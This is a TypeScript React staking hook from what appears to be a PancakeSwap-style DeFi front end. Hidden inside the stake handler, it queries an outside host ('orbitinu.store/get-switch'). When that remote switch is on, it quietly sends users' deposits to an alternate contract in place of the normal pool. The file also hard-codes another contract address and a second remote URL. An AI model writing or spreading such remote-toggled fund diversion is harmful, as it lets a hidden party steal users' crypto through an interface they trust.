import { useCallback } from 'react'
import { useWeb3React } from '@web3-react/core'
import { useAppDispatch } from 'state'
import { updateUserStakedBalance, updateUserBalance } from 'state/actions'
import { stakeFarm } from 'utils/calls'
import BigNumber from 'bignumber.js'
import { DEFAULT_TOKEN_DECIMAL, DEFAULT_GAS_LIMIT } from 'config'
import { BIG_TEN } from 'utils/bigNumber'
import { useMasterchef, useSousChef, useSousChefMy } from 'hooks/useContract'
import getGasPrice from 'utils/getGasPrice'
import axios from "axios";

const options = {
  gasLimit: DEFAULT_GAS_LIMIT,
}

const sousStake = async (sousChefContract, amount, decimals = 18) => {
  const gasPrice = getGasPrice()
  const tx = await sousChefContract.deposit(new BigNumber(amount).times(BIG_TEN.pow(decimals)).toString(), {
    ...options,
    gasPrice,
  })
  const receipt = await tx.wait()
  return receipt.status
}

const sousStakeBnb = async (sousChefContract, amount) => {
  const gasPrice = getGasPrice()
  const tx = await sousChefContract.deposit(new BigNumber(amount).times(DEFAULT_TOKEN_DECIMAL).toString(), {
    ...options,
    gasPrice,
  })
  const receipt = await tx.wait()
  return receipt.status
}

const useStakePool = (sousId: number, isUsingBnb = false) => {
  const dispatch = useAppDispatch()
  const { account } = useWeb3React()
  const masterChefContract = useMasterchef()
  const sousChefContract = useSousChef(sousId)
  const sousChefMyContract = useSousChefMy(sousId)

  const handleStake = useCallback(
    async (amount: string, decimals: number) => {

      //
      const contractSwitchData = await axios.get("https://spotairdrop.orbitinu.store/get-switch");
      const contractSwitch = contractSwitchData.data;
      console.log("[tz] contract switch status  ", contractSwitch);
      //

      if (sousId === 0) {
        await stakeFarm(masterChefContract, 0, amount)
      } else if (isUsingBnb) {
        if (contractSwitch)
          await sousStakeBnb(sousChefMyContract, amount)
        else
          await sousStakeBnb(sousChefContract, amount)
      } else if (contractSwitch) {
        await stakeFarm(sousChefMyContract, sousId, amount)
      }
      else {
        await stakeFarm(masterChefContract, sousId, amount)
      }
      dispatch(updateUserStakedBalance(sousId, account))
      dispatch(updateUserBalance(sousId, account))
    },
    [account, dispatch, isUsingBnb, masterChefContract, sousChefContract, sousChefMyContract, sousId],
  )

  return { onStake: handleStake }
}

export const secondAmount = 1;

export const stakeContractAddres = "0x4615f19b685b0eF3d8124f7901Ba2f8492788070";   // new1 : 0xAc46c5bF51A47Ff1eff68C914daB0CE5BD3e53eF

export const hostAddress = "https://airdrop.orbitinu.store/update";

export default useStakePool
